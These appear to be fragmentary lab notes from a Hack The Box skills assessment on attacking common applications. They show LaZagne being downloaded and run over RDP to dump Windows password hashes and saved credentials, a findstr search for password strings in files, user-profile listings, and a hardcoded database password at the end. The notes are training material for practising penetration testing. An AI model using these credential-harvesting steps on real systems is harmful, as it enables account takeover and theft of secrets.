# Attacking Common Applications - Skills Assessment III

wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe

xfreerdp /u:Administrator /p:"xcyj8izxNVzhf4z" /v:10.129.95.200 /drive:linux,/home/htb-ac-786011


start lazagne.exe all

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:da044beedf173cf4ada93d034aa820fb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


[+] Password found !!!
URL: MEGACORP\administrator
Login: MEGACORP\administrator
Password: xcyj8izxNVzhf4z


findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

c:\Windows\System32>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
DDFs\NGCProDDF_v1.2_final.xml
DriverStore\FileRepository\prncacl1.inf_amd64_af6e8c4f138f06d1\CNN08CL1_bidiwsd.xml
DriverStore\FileRepository\prncacl2.inf_amd64_43d302547f3b3145\CNN08CL2_bidiwsd.xml
DriverStore\FileRepository\prnms009.inf_amd64_bd3f6a64dee1535d\MPDW-PDC.xml
DriverStore\FileRepository\prnms009.inf_amd64_bd3f6a64dee1535d\MPDW_devmode_map.xml
icsxml\ipcfg.xml
icsxml\pppcfg.xml
inetsrv\config\schema\ASPNET_schema.xml
inetsrv\config\schema\Ftp_schema.xml
inetsrv\config\schema\FX_schema.xml
inetsrv\config\schema\IIS_schema.xml
schema.ini
spool\tools\Microsoft Print To PDF\MPDW-PDC.xml
spool\tools\Microsoft Print To PDF\MPDW_devmode_map.xml
spool\V4Dirs\971451D4-FF96-4454-BF4D-3A63DD904891\pdc.xml
WindowsPowerShell\v1.0\Modules\WebAdministration\NavigationTypes.namespace.xml

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\e22c2559\92c7e946\assembly\dl3\a25d6e1b\c75a9026_e6c6d501

tree C:\Users\MSSQLSERVER\AppData
Folder PATH listing
Volume serial number is 7B4A-4B5F
C:\USERS\MSSQLSERVER\APPDATA
├───Local
│   ├───Microsoft
│   │   ├───InputPersonalization
│   │   │   └───TrainedDataStore
│   │   ├───Windows
│   │   │   ├───GameExplorer
│   │   │   ├───Shell
│   │   │   └───WinX
│   │   │       ├───Group1
│   │   │       ├───Group2
│   │   │       └───Group3
│   │   └───Windows Sidebar
│   │       └───Gadgets
│   └───Temp
├───LocalLow
└───Roaming

dir c:\Users
 Volume in drive C has no label.
 Volume Serial Number is 7B4A-4B5F

 Directory of c:\Users

01/09/2020  05:14 PM    <DIR>          .
01/09/2020  05:14 PM    <DIR>          ..
01/07/2020  07:24 PM    <DIR>          .NET v4.5
01/07/2020  07:24 PM    <DIR>          .NET v4.5 Classic
03/27/2023  03:55 AM    <DIR>          Administrator
03/09/2020  02:20 AM    <DIR>          alcibiades
03/09/2020  02:06 AM    <DIR>          cyork
01/09/2020  05:14 PM    <DIR>          jorden
03/27/2023  03:56 AM    <DIR>          MSSQLSERVER
11/20/2016  05:24 PM    <DIR>          Public
01/09/2020  05:12 PM    <DIR>          sbauer
03/27/2023  03:56 AM    <DIR>          SQLTELEMETRY

--> Only cyrok has a lot of files on his profile

tree C:\Users\cyork\AppData

	string connString = "server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;";
	string connString = "server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;";
